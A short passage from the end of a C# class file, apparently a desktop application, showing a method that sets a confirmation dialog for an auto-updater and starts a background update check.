        /// </summary>
        private void CheckUpdateBackground()
        {
            this.autoUpdater.RestartForm = new ConfirmForm(this.autoUpdater);
            this.autoUpdater.TryUpdateBackground();
        }

    }
}